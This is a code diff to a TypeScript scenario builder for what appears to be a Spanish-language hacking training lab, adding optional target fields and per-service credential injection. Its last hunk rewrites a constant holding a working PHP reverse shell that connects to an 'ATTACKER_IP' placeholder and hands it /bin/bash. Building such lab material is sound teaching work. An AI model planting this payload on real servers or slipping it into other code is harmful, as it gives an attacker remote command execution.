@@ -20,7 +20,21 @@ export interface ScenarioBuilderConfig {
   difficulty: 'Easy' | 'Medium' | 'Hard';
   category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
   networkRange: string; attackerFiles?: FileEntry[];
-  targetMachine: Omit<Machine, 'machine_info' | 'id' | 'learning_steps'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
+  // Máquina objetivo: se define UNA sola vez por lab (P1-10). Los campos
+  // discovery_level/scan_results/learning_steps los completa buildScenario;
+  // quedan opcionales solo por compatibilidad con labs que aún los declaran.
+  targetMachine: Omit<Machine, 'machine_info' | 'id' | 'learning_steps' | 'discovery_level' | 'scan_results' | 'web_enumeration'> & {
+    id: string;
+    machine_info: Omit<MachineInfo, 'ip'>;
+    ports: Port[];
+    discovery_level?: number;
+    scan_results?: { ports: Port[] };
+    learning_steps?: LearningStep[];
+    web_enumeration?: Machine['web_enumeration'];
+  };
+  // Credenciales a inyectar en los puertos del objetivo, clave = service
+  // (ej. { ssh: credentials.ssh }). Única fuente: el bloque credentials del lab.
+  portCredentials?: Record<string, { user: string; pass: string }>;
   learningSteps: (Omit<LearningStep, 'id' | 'targetMachineId'> & { validationCriteria?: import('../types').ValidationCriteria })[];
 }
 
@@ -29,10 +43,18 @@ export function buildScenario(config: ScenarioBuilderConfig): Scenario {
   if (config.attackerFiles?.length) {
     attacker.files = [...attacker.files, ...config.attackerFiles];
   }
+  // Inyección declarativa de credenciales por servicio (P1-10): antes cada lab
+  // rearmaba el array de ports a mano para pegar las credenciales al puerto.
+  const ports: Port[] = config.portCredentials
+    ? config.targetMachine.ports.map(p => {
+        const creds = config.portCredentials?.[p.service];
+        return creds ? { ...p, credentials: creds } : p;
+      })
+    : config.targetMachine.ports;
   const target: Machine = {
     ...config.targetMachine,
     machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
-    scan_results: { ports: config.targetMachine.ports },
+    scan_results: { ports },
     web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
     discovery_level: 0,
     learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1, targetMachineId: config.targetMachine.id })),
@@ -97,7 +119,7 @@ export function createFile(
 }
 
 export const REVERSE_SHELL_PAYLOAD = {
-  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
+  phpSimple: `<?php\n$ip = "ATTACKER_IP"; $port = LISTENER_PORT;\n$sock = fsockopen($ip, $port);\nif($sock === false) { echo "No connection"; exit(); }\n$proc = proc_open('/bin/bash', array(0=>$sock,1=>$sock,2=>$sock), $pipes);\n?>`,
 };
 
 // Re-exportar funciones de fs-models para compatibilidad
